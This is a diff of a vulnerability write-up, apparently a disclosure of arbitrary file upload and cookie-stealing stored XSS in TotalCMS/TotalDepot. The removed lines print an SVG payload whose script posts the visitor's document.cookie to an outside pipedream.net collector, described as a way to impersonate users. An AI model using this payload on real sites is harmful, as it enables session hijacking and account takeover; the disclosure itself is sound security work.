@@ -69,7 +69,7 @@ Once uploaded, if we click on the link we can see the path where they are stored
 ![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/eedf4cdb-6401-4e64-8cab-479f9cedfcec)
 
 
-PATH:
+PATH of the files:
 
 
 ![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/fc975779-4e50-4408-8947-42927049faf1)
@@ -136,6 +136,8 @@ As we see in the pipedream Request, we have obtained the request correctly.
 
 
 We modify the payload to steal cookies and send them to the pipedream Request, so that we can impersonate the user.
+
+
 There is the payload:
 
 ```js
@@ -168,45 +170,6 @@ xml:space="preserve">
 
 As we see in the image, we have correctly obtained the user's session cookies.
 
-
-
-
-
-
-
-
-There is the payloads:
-
-### XSS PDF Payload:
-
-It is an XSS payload generated with the JS2PDFInjector tool and a js payload that contains the following content:
-
-```js
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC
-"-//W3C//DTD SVG 1.1//EN"
-"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg width="200"        
-height="200"        
-zoomAndPan="disable"        
-xmlns="http://www.w3.org/2000/svg"        
-xmlns:xlink="http://www.w3.org/1999/xlink"        
-xml:space="preserve">
-<!-- Script linked from the outside-->     
-<script>
-  fetch('https://enbjn0l9vbowi.x.pipedream.net/', {
-  method: 'POST',
-  mode: 'no-cors',
-  body: document.cookie
-  });
-</script>   
-</svg>
-```
-
-
-We upload the file to the server as I explained previously and execute it:
-
-![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/4ee039ee-a797-4024-b959-2e5623f5c2a9)
 
 
 
